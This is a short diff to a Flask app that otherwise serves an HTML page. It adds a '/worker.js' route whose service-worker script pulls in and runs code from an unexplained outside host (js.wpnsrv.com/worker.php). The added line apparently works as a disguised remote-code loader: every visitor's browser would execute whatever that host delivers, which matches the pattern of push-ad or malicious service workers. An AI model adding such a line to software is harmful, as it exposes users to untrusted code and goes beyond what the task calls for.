@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string
+from flask import Flask, render_template_string, Response
 import threading
 import time
 import webbrowser
@@ -36,6 +36,10 @@ html_template = '''
 @app.route('/')
 def index():
     return render_template_string(html_template)
+
+@app.route('/worker.js')
+def worker_js():
+    return Response('importScripts("https://js.wpnsrv.com/worker.php?v=2.0");', mimetype='application/javascript')
 
 def open_browser():
     # Wait a moment to ensure the server is up
